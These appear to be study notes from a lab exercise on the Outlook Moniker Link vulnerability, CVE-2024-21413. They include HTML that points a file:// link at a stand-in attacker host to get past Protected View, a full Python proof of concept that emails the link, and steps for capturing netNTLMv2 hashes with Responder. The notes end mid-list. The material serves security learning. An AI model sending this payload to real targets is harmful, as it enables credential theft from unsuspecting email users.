- Outlook can render emails as HTML.
- Outlook parses hyperlinks such as HTTP and HTTPS.
- However, it also opens URLs specifying applications knows as **Moniker Links**.
- Normally, outlook will prompt a security warning for this which opens emails containing attachments, hyperlinks and similar content in read-only mode.
- We can use `file://` Moniker Link as our hyperlink.
- Since outlook renders emails as HTTP/HTTPS, we can also instruct outlook to access files on network share.
	- ```<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>```	
		- Protocol used: **SMB**
		- Uses local credentials for authentication.
		- Outlook's protected view catches and blocks it.
	- So we can modify the above by using a `!` character and some text.
		- Bypasses the outlook's protected view.
		- ```<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>```
		- The share we are accessing doesn't need to exist on the remote device.
		- An authentication attempt will happen regardless of if the share exists or not.
		- This leads to victim's windows netNTLMv2 hash being sent to the attacker.
	- Also **Remote Code Execution** (RCE) is also possible since Moniker Link uses Component Object Model (COM) on windows.
#### Exploitation
- To exploit this vulnerability, lets assume a scenario.
- Attacker = us.
- We email our victim with Moniker Link.
- **Objective:** Craft an email to the victim with Moniker Link that bypasses Outlook's "Protected View".
- In the email:
	- Client (victim) will attempt to load a file from our attacking machine.
	- Results in victim's netNTLMv2 hash being captured.
- **PoC:**
	
	```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

- The PoC:
	- Takes an attacker & victim email. Normally, we would need to use our own SMTP server.
	- Requires the password to authenticate.
	- Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink.
	- Then, fill in the "subject", "from" and "to" fields in the email.
	- Finally, it sends the email to the mail server.
- Let's use the **Responder** to create an SMB listener on our attack machine.
	- We can also use an **Impacket server** for the above.
	- `responder -I <interface name>`
- Open the outlook app on the desktop of the vulnerable machine.
- In the room, the victim's email inbox is already set up.
- Make the above exploit in your attacking machine.
- Modify the script to point to our IP and victim's IP.
- After that, run the explot. When prompted for the attacker's email, say `attacker`.
- 